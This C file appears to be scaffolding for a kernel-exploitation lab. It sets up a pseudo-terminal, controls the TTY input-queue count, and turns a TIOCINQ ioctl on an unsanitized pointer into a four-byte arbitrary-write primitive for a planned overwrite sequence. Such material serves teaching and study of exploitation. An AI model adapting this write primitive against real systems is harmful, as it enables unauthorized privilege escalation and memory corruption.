#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include "exploit.h"

// --------------------------------------------------------------------------
// These helper functions provide convenient wrappers for the adjustment of
// the 'TTY Input Queue' fill level (the value FIONREAD/TIOCINQ exposes).
// --------------------------------------------------------------------------

static int pts_master, pts_slave;
static char buffer[512];
static int level;

/**
 * Creates a new TTY device (actually a device pair). Don't worry about the
 * technical details. If you're curious, you can read up on the functions
 * that this one calls.
 */
void open_pts(void) {
	pts_master = posix_openpt(O_RDWR | O_NOCTTY | O_NONBLOCK);
	if (pts_master < 0) {
		fprintf(stderr, "open_pts(): could not open master pseudo-terminal\n");
		exit(1);
	}
	if (unlockpt(pts_master)) {
		fprintf(stderr, "open_pts(): could not unlock master pseudo-terminal\n");
		exit(1);
	}
	if (grantpt(pts_master)) {
		fprintf(stderr, "open_pts(): could not grant master pseudo-terminal\n");
		exit(1);
	}
	pts_slave = open(ptsname(pts_master), O_RDWR | O_NOCTTY | O_NONBLOCK);
	if (pts_slave < 0) {
		fprintf(stderr, "open_pts(): could not open slave pseudo-terminal\n");
		exit(1);
	}

	memset(buffer, '@', 512);
}

/**
 * Queue up the given number of characters at the TTY. Write it as a single
 * line of input with a newline at the end, so that it will be consumed by a
 * single read() call even if the line discipline is configured to line mode.
 */
void adjust_inq_level(unsigned int count) {
	unsigned int result = 0;

	if (level != 0) {
		fprintf(stderr, "adjust_inq_level(): drain first, then adjust again\n");
		exit(1);
	}

	while (result != count) {

		if (count > 256) {
			fprintf(stderr, "adjust_inq_level(): expected count in the range [0,255]\n");
			exit(1);
		}

		buffer[count-1] = '\n';
		result = write(pts_master, buffer, count);
		buffer[count-1] = '@';

		if (result != count) {
			fprintf(stderr, "?");
			drain_inq_level();
		}
	}

	level = count;
}

/**
 * Flush the queue of the TTY, dropping the count back to zero.
 */
void drain_inq_level(void) {
	while (read(pts_slave, buffer+256, 256) > 0)
		;

	level = 0;
}

/**
 * Exploit the write bug, storing the number of queued characters to the
 * provided (unsanitized) int pointer. Note that this writes a word, i.e.
 * FOUR bytes - you'll have to take this into account when planning your
 * overwrite sequence.
 */
void write_a_word(void *address) {
	int level_test;
	int ioctl_success;

	(void)ioctl(pts_slave, TIOCINQ, &level_test);

	if (level != level_test) {
		write(2, "E", 1);
		return;
	}

	ioctl_success = ioctl(pts_slave, TIOCINQ, address);

	if (ioctl_success != 0) {
		write(2, "F", 1);
		return;
	}
}
